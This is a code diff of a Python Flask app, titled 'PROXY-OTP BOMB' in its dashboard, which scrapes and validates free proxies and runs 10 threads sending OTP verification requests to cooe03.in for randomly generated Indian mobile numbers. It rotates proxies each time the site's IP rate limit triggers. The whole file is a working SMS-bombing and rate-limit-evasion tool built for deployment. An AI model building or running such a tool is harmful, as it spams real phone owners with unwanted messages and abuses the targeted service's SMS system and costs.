@@ -1,18 +1,19 @@
-import asyncio
-import aiohttp
-import random
+import os
 import time
-import threading
+import random
 import json
-import datetime
+import threading
+import requests
+from datetime import datetime
+from concurrent.futures import ThreadPoolExecutor
 from flask import Flask, jsonify, render_template_string, Response
 
 app = Flask(__name__)
 
-# --- GLOBAL STATE & QUEUES ---
+# --- GLOBAL STATE ---
 STATE = {
-    "start_time_unix": time.time(),
-    "start_time_str": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC"),
+    "start_time": time.time(),
+    "start_time_str": datetime.now().strftime("%Y-%m-%d %H:%M:%S UTC"),
     "code_200": 0,
     "code_400": 0,
     "proxies_fetched": 0,
@@ -22,85 +23,115 @@ STATE = {
 }
 
 PROXIES_LIVE_QUEUE = []
+BG_THREADS_STARTED = False
+LOG_LOCK = threading.Lock()
 
-# --- LOGGING HELPER ---
-def log_sys(msg, level="info", mobile="N/A", proxy="N/A"):
-    """Appends detailed logs to the state."""
-    entry = {
-        "time": datetime.datetime.now().strftime("%H:%M:%S"),
-        "message": msg,
-        "level": level,
-        "mobile": mobile,
-        "proxy": proxy
+# --- LOGGING SYSTEM ---
+def log_sys(msg, level="info", target="N/A", proxy="N/A"):
+    """Thread-safe logging system that pushes data to the UI."""
+    with LOG_LOCK:
+        entry = {
+            "time": datetime.now().strftime("%H:%M:%S"),
+            "message": msg,
+            "level": level,
+            "target": target,
+            "proxy": proxy
+        }
+        STATE["logs"].insert(0, entry)
+        # Cap memory usage for Render's free tier
+        if len(STATE["logs"]) > 2000:
+            STATE["logs"] = STATE["logs"][:2000]
+
+# --- MULTIPLE PROXY FETCHERS ---
+def fetch_raw_proxies():
+    """Fetches free proxies from 4 different global sources."""
+    sources = [
+        "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all",
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+        "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+        "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt"
+    ]
+    
+    raw_proxies = set()
+    log_sys("SYSTEM: Reaching out to 4 global proxy APIs...", "info")
+    
+    for url in sources:
+        try:
+            resp = requests.get(url, timeout=10)
+            if resp.status_code == 200:
+                lines = resp.text.strip().split('\n')
+                for line in lines:
+                    proxy = line.strip()
+                    if ":" in proxy:
+                        raw_proxies.add(proxy)
+        except Exception as e:
+            log_sys(f"SYSTEM: Failed to fetch from {url} - {str(e)}", "warn")
+
+    proxy_list = list(raw_proxies)
+    random.shuffle(proxy_list)
+    return proxy_list[:500] # Take exactly 500 random proxies
+
+def check_single_proxy(proxy):
+    """Pings a lightweight endpoint to check if the proxy is actually alive."""
+    proxies = {
+        "http": f"http://{proxy}",
+        "https": f"http://{proxy}"
     }
-    STATE["logs"].insert(0, entry)
-    # Cap logs in memory to 5000 to prevent RAM overflow on Render's 512MB free tier
-    if len(STATE["logs"]) > 5000:
-        STATE["logs"] = STATE["logs"][:5000]
-
-# --- ASYNC BACKGROUND TASKS ---
-async def fetch_and_check_proxies(session):
-    """Fetch 500 proxies and verify which ones are live."""
-    log_sys("SYSTEM: Initiating fetch for 500 global proxies...", "system")
-    
-    url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=all&ssl=all&anonymity=all"
     try:
-        async with session.get(url) as resp:
-            text = await resp.text()
-            proxies = text.strip().split('\r\n')
-            # Grab exactly 500 proxies
-            proxies = proxies[:500] 
-            STATE["proxies_fetched"] += len(proxies)
-            log_sys(f"SYSTEM: Successfully downloaded {len(proxies)} proxies. Starting live checks...", "system")
-            
-            # Helper function to check a single proxy
-            async def check_proxy(p):
-                try:
-                    # Test proxy against a fast, lightweight IP checker
-                    proxy_url = f"http://{p}"
-                    async with session.get("http://api.ipify.org/", proxy=proxy_url, timeout=5) as r:
-                        if r.status == 200:
-                            PROXIES_LIVE_QUEUE.append(p)
-                            STATE["proxies_live"] += 1
-                            log_sys(f"PROXY VALIDATED: {p} is LIVE.", "success", proxy=p)
-                        else:
-                            STATE["proxies_dead"] += 1
-                            log_sys(f"PROXY REJECTED: {p} returned status {r.status}.", "error", proxy=p)
-                except Exception:
-                    STATE["proxies_dead"] += 1
-                    log_sys(f"PROXY DEAD: {p} connection timeout/failed.", "error", proxy=p)
+        # Generate 204 is a fast, empty response from Google used for connectivity checks
+        res = requests.get("http://connectivitycheck.gstatic.com/generate_204", proxies=proxies, timeout=5)
+        if res.status_code == 204:
+            PROXIES_LIVE_QUEUE.append(proxy)
+            STATE["proxies_live"] += 1
+            log_sys(f"VALIDATED: Proxy is ALIVE and added to queue.", "success", proxy=proxy)
+        else:
+            STATE["proxies_dead"] += 1
+    except:
+        STATE["proxies_dead"] += 1
 
-            # Check proxies concurrently in batches of 50 to avoid socket exhaustion
-            chunk_size = 50
-            for i in range(0, len(proxies), chunk_size):
-                tasks = [check_proxy(p) for p in proxies[i:i+chunk_size]]
-                await asyncio.gather(*tasks)
-                
-            log_sys(f"SYSTEM: Proxy batch check complete. Current Live Queue: {len(PROXIES_LIVE_QUEUE)}", "system")
-            
-    except Exception as e:
-        log_sys(f"SYSTEM ERROR: Failed to fetch proxies from API. {str(e)}", "error")
-
-async def otp_worker(session, worker_id):
-    """Worker that grabs a live proxy and loops OTPs until hitting 400."""
-    global PROXIES_LIVE_QUEUE
-    
+def proxy_manager_thread():
+    """Background thread that ensures the live proxy queue never runs dry."""
     while True:
-        # Wait if no proxies are available
+        if len(PROXIES_LIVE_QUEUE) < 20:
+            log_sys(f"SYSTEM: Live proxy queue low ({len(PROXIES_LIVE_QUEUE)}). Fetching 500 new proxies...", "info")
+            new_proxies = fetch_raw_proxies()
+            STATE["proxies_fetched"] += len(new_proxies)
+            
+            log_sys(f"SYSTEM: Downloaded {len(new_proxies)} raw proxies. Spawning 50 threads to verify...", "info")
+            
+            # Use 50 threads to quickly check all 500 proxies
+            with ThreadPoolExecutor(max_workers=50) as executor:
+                executor.map(check_single_proxy, new_proxies)
+                
+            log_sys(f"SYSTEM: Verification complete. Total Live Queue: {len(PROXIES_LIVE_QUEUE)}", "success")
+        
+        time.sleep(5)
+
+# --- OTP WORKER LOGIC ---
+def otp_worker_thread(worker_id):
+    """Worker thread that grabs a proxy and blasts OTPs until it hits a 400 limit."""
+    while True:
         if not PROXIES_LIVE_QUEUE:
-            await asyncio.sleep(2)
+            time.sleep(2)
             continue
             
-        # 1. Grab a live proxy
+        # 1. Grab a guaranteed live proxy
         current_proxy = PROXIES_LIVE_QUEUE.pop(0)
-        STATE["proxies_live"] -= 1
-        log_sys(f"[WORKER-{worker_id}] Acquired live proxy. Initiating OTP loop.", "system", proxy=current_proxy)
-        proxy_url = f"http://{current_proxy}"
+        STATE["proxies_live"] = len(PROXIES_LIVE_QUEUE)
+        log_sys(f"[THREAD-{worker_id}] Acquired live proxy. Engaging target loop.", "info", proxy=current_proxy)
         
-        # 2. Loop continuously on this proxy
+        proxy_dict = {
+            "http": f"http://{current_proxy}",
+            "https": f"http://{current_proxy}"
+        }
+
+        # 2. Loop on this specific proxy until blocked
         while True:
-            # Generate random 10-digit Indian mobile number
+            # Generate Indian Mobile Number (+91 followed by 6,7,8,9 and 9 digits)
             mobile = "+91" + random.choice("6789") + "".join(random.choices("0123456789", k=9))
+            
+            # Formulate Cooe API Request
+            url = "https://cooe03.in/user/send_verify_code"
             payload = {"mobile_number": mobile, "verify_type": "register"}
             headers = {
                 "Origin": "https://cooe03.in",
@@ -110,68 +141,65 @@ async def otp_worker(session, worker_id):
                 "Accept": "application/json, text/plain, */*"
             }
 
-            log_sys(f"[WORKER-{worker_id}] Sending OTP request...", "info", mobile=mobile, proxy=current_proxy)
+            log_sys(f"[THREAD-{worker_id}] Sending OTP packet...", "info", target=mobile, proxy=current_proxy)
 
             try:
-                # 3. Send Request
-                async with session.post("https://cooe03.in/user/send_verify_code", json=payload, headers=headers, proxy=proxy_url, timeout=12) as resp:
-                    try:
-                        data = await resp.json()
-                        code = data.get("code", resp.status)
-                    except:
-                        code = resp.status
+                # 3. Fire the request
+                res = requests.post(url, json=payload, headers=headers, proxies=proxy_dict, timeout=10)
+                
+                try:
+                    data = res.json()
+                    code = data.get("code", res.status_code)
+                except:
+                    code = res.status_code
+
+                # 4. Handle Server Response
+                if code == 200:
+                    STATE["code_200"] += 1
+                    log_sys(f"[THREAD-{worker_id}] STATUS 200: OTP Packet delivered.", "success", target=mobile, proxy=current_proxy)
+                    time.sleep(1) # Small delay before reusing same proxy
+                    continue # Loop again with the same proxy
                     
-                    # 4. Handle Response
-                    if code == 200:
-                        STATE["code_200"] += 1
-                        log_sys(f"[WORKER-{worker_id}] CODE 200: OTP successfully sent.", "success", mobile=mobile, proxy=current_proxy)
-                        await asyncio.sleep(1) # Slight delay before reusing the proxy
-                        continue # Keep using the same proxy
-                        
-                    elif code == 400:
-                        STATE["code_400"] += 1
-                        log_sys(f"[WORKER-{worker_id}] CODE 400: IP limit reached. Discarding proxy.", "warn", mobile=mobile, proxy=current_proxy)
-                        break # Break inner loop, discard proxy, get a new one
-                        
-                    else:
-                        log_sys(f"[WORKER-{worker_id}] CODE {code}: Unexpected response. Discarding proxy.", "error", mobile=mobile, proxy=current_proxy)
-                        break # Break inner loop
-            
+                elif code == 400:
+                    STATE["code_400"] += 1
+                    log_sys(f"[THREAD-{worker_id}] STATUS 400: IP limit reached. Proxy burned.", "error", target=mobile, proxy=current_proxy)
+                    break # Break inner loop, grab a new proxy
+                    
+                else:
+                    log_sys(f"[THREAD-{worker_id}] UNKNOWN {code}: Bad response. Burning proxy.", "warn", target=mobile, proxy=current_proxy)
+                    break # Break inner loop, grab a new proxy
+
             except Exception as e:
-                log_sys(f"[WORKER-{worker_id}] CONNECTION LOST: Proxy died during request. Discarding.", "error", mobile=mobile, proxy=current_proxy)
-                break # Break inner loop
+                log_sys(f"[THREAD-{worker_id}] TIMEOUT/DROP: Proxy disconnected. Burning.", "error", target=mobile, proxy=current_proxy)
+                break # Break inner loop, grab a new proxy
 
-async def proxy_manager(session):
-    """Background task to ensure we always have live proxies."""
-    while True:
-        if len(PROXIES_LIVE_QUEUE) < 15:
-            await fetch_and_check_proxies(session)
-        await asyncio.sleep(10)
-
-async def master_async_loop():
-    """Starts the proxy manager and the 10 simultaneous workers."""
-    async with aiohttp.ClientSession() as session:
+# --- FLASK SERVER & BOOTSTRAP ---
+def init_background_threads():
+    global BG_THREADS_STARTED
+    if not BG_THREADS_STARTED:
+        log_sys("SYSTEM: Initializing background routing threads...", "info")
+        
         # Start Proxy Manager
-        manager_task = asyncio.create_task(proxy_manager(session))
+        threading.Thread(target=proxy_manager_thread, daemon=True).start()
         
-        # Start 10 Simultaneous Workers
-        workers = [asyncio.create_task(otp_worker(session, i)) for i in range(1, 11)]
-        
-        await asyncio.gather(manager_task, *workers)
+        # Start 10 Simultaneous OTP Workers
+        for i in range(1, 11):
+            threading.Thread(target=otp_worker_thread, args=(i,), daemon=True).start()
+            
+        BG_THREADS_STARTED = True
 
-def start_background_loop(loop):
-    asyncio.set_event_loop(loop)
-    loop.run_forever()
+@app.before_request
+def activate_threads():
+    # Ensures threads start safely inside Render's Gunicorn workers
+    init_background_threads()
 
-
-# --- FLASK ROUTES ---
 @app.route('/')
 def index():
     return render_template_string(HTML_TEMPLATE)
 
 @app.route('/api/stats')
 def stats():
-    uptime_seconds = int(time.time() - STATE["start_time_unix"])
+    uptime_seconds = int(time.time() - STATE["start_time"])
     hours, remainder = divmod(uptime_seconds, 3600)
     minutes, seconds = divmod(remainder, 60)
     
@@ -183,15 +211,14 @@ def stats():
         "proxies_fetched": STATE["proxies_fetched"],
         "proxies_dead": STATE["proxies_dead"],
         "proxies_live_queue": len(PROXIES_LIVE_QUEUE),
-        "logs": STATE["logs"][:100] # Send only the latest 100 logs to the UI
+        "logs": STATE["logs"][:80] # Send latest 80 logs to UI
     })
 
 @app.route('/api/export')
 def export_data():
-    """Export all stored logs as JSON."""
     def generate():
         yield json.dumps({
-            "export_time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+            "export_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
             "statistics": {
                 "total_200": STATE["code_200"],
                 "total_400": STATE["code_400"],
@@ -202,7 +229,6 @@ def export_data():
         }, indent=4)
     return Response(generate(), mimetype='application/json', headers={'Content-Disposition': 'attachment;filename=otp_traffic_logs.json'})
 
-
 # --- UI TEMPLATE (Cyber Hacker Vibe) ---
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -210,10 +236,10 @@ HTML_TEMPLATE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SYS.TERMINAL // TRAFFIC ROUTER</title>
+    <title>SYS.TERMINAL // PROXY-OTP BOMB</title>
     <style>
         body {
-            background-color: #0d0d0d;
+            background-color: #050505;
             color: #00ff00;
             font-family: 'Courier New', Courier, monospace;
             margin: 0;
@@ -250,13 +276,13 @@ HTML_TEMPLATE = """
             margin-top: 10px;
             text-shadow: 0 0 5px #00ff00;
         }
-        .box-red { border-color: #ff3333; color: #ff3333; box-shadow: 0 0 10px rgba(255, 51, 51, 0.2); background: rgba(255, 51, 51, 0.03);}
+        .box-red { border-color: #ff3333; color: #ff3333; box-shadow: 0 0 10px rgba(255, 51, 51, 0.2); }
         .box-red .stat-value { text-shadow: 0 0 5px #ff3333; }
         
-        .box-cyan { border-color: #00ffff; color: #00ffff; box-shadow: 0 0 10px rgba(0, 255, 255, 0.2); background: rgba(0, 255, 255, 0.03);}
+        .box-cyan { border-color: #00ffff; color: #00ffff; box-shadow: 0 0 10px rgba(0, 255, 255, 0.2); }
         .box-cyan .stat-value { text-shadow: 0 0 5px #00ffff; }
 
-        .box-gray { border-color: #888; color: #888; box-shadow: 0 0 10px rgba(136, 136, 136, 0.2); background: rgba(136, 136, 136, 0.03);}
+        .box-gray { border-color: #888; color: #888; box-shadow: 0 0 10px rgba(136, 136, 136, 0.2); }
         .box-gray .stat-value { text-shadow: 0 0 5px #888; }
 
         .terminal-container {
@@ -268,16 +294,27 @@ HTML_TEMPLATE = """
             height: 500px;
             overflow-y: auto;
         }
-        .log-row {
-            margin-bottom: 5px;
-            line-height: 1.4;
-            font-size: 14px;
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        th, td {
+            padding: 8px;
+            text-align: left;
+            border-bottom: 1px solid #003300;
+            font-size: 13px;
+        }
+        th {
+            background: #002200;
+            position: sticky;
+            top: 0;
+            color: #fff;
         }
         .level-system { color: #00ffff; }
         .level-success { color: #00ff00; }
         .level-error { color: #ff3333; }
         .level-warn { color: #ffcc00; }
-        .level-info { color: #ffffff; }
+        .level-info { color: #aaaaaa; }
         
         .btn-export {
             display: block;
@@ -337,8 +374,20 @@ HTML_TEMPLATE = """
 
     <a href="/api/export" target="_blank" class="btn-export">>> EXPORT FULL TRAFFIC HISTORY (.JSON) <<</a>
 
-    <div class="terminal-container" id="terminal">
-        <!-- Logs injected here via JS -->
+    <div class="terminal-container">
+        <table>
+            <thead>
+                <tr>
+                    <th width="10%">TIME</th>
+                    <th width="45%">EVENT LOG</th>
+                    <th width="20%">TARGET (MOBILE)</th>
+                    <th width="25%">ROUTED PROXY</th>
+                </tr>
+            </thead>
+            <tbody id="log_body">
+                <tr><td colspan="4">Initializing system... Please refresh the page if logs do not appear.</td></tr>
+            </tbody>
+        </table>
     </div>
 
     <script>
@@ -354,36 +403,37 @@ HTML_TEMPLATE = """
                     document.getElementById('val_200').innerText = data.code_200;
                     document.getElementById('val_400').innerText = data.code_400;
 
-                    const terminal = document.getElementById('terminal');
-                    terminal.innerHTML = ''; // Clear and re-render
+                    const tbody = document.getElementById('log_body');
+                    tbody.innerHTML = ''; 
                     
                     data.logs.forEach(log => {
-                        const div = document.createElement('div');
-                        div.className = `log-row level-${log.level}`;
-                        div.innerText = `[${log.time}] ${log.message} | TGT: ${log.mobile} | PRX: ${log.proxy}`;
-                        terminal.appendChild(div);
+                        const tr = document.createElement('tr');
+                        tr.className = `level-${log.level}`;
+                        tr.innerHTML = `
+                            <td>${log.time}</td>
+                            <td>${log.message}</td>
+                            <td>${log.target}</td>
+                            <td>${log.proxy}</td>
+                        `;
+                        tbody.appendChild(tr);
                     });
                 })
                 .catch(err => console.error("Sync Error:", err));
         }
 
-        // Poll API every 1 second
-        setInterval(fetchStats, 1000);
-        fetchStats();
+        // Poll API every 1.5 seconds
+        setInterval(fetchStats, 1500);
+        
+        // Initial Fetch
+        setTimeout(fetchStats, 500);
     </script>
 </body>
 </html>
 """
 
 if __name__ == '__main__':
-    import os
-    
-    # 1. Start Async Loop in Background Thread
-    loop = asyncio.new_event_loop()
-    t = threading.Thread(target=start_background_loop, args=(loop,), daemon=True)
-    t.start()
-    asyncio.run_coroutine_threadsafe(master_async_loop(), loop)
-
-    # 2. Start Flask Server (Render dynamically assigns a PORT)
+    # Flask app runs on the assigned port
     port = int(os.environ.get('PORT', 5000))
+    # We trigger the threads BEFORE running the app to ensure they start immediately
+    init_background_threads()
     app.run(host='0.0.0.0', port=port)
